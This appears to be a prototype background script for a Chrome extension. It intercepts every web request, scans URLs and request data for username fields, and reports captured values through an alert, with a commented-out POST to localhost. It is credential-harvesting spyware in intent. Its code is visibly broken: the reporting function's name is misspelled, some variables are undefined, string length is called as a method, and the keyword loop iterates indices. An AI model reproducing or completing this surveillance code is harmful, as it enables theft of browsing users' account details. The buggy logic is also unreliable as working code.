chrome.webRequest.onBeforeRequest.addListener(onBeforeRequest, {urls: ["http://*/*", "https://*/*"]}, ["blocking"]);
var userRules=new Array('username','uname',"user",'login','user_name');
function PostReposrt(strUrl,strUser,strType)
{
alert('Data captured\n:url:'+strUrl+"\nUser:"+strUser);
//    var request = new XMLHttpRequest();
//    request.open("POST", "http://localhost/?test");
}
function checkStr(strUrl)
{
	    for(var rule in userRules)
		{
		if(strUrl.indexOf(rule)!=-1)
		{
		idx=strUrl.indexOf(rule);
		idx2=strUrl.indexOf("&",idx);
		if(idx2==-1)
		{
			idx2=strUrl.length();
		}
		var strUser=strUrl.substr(idx+1+rule.length(),idx2-idx1);
		return strUser;
		}
		}
}
function onBeforeRequest(details)
{
  if (details.tabId == -1)
    return {};
	var userName=checkStr(details.url);  
	if(userName.length()==0)
	{
	userName=checkStr(details.data);  
	}
	if(userName.length()>0)
	{
	PostReport(details.url,strUser,details.method);
	}
  return {};
}

chrome.extension.onRequest.addListener(function(request, sender, cb) {
try{
if(request.method=="PostReport")
{
 PostReport(request.url,request.user,request.type);
}
}catch(e){alert('e1='+e);}
});

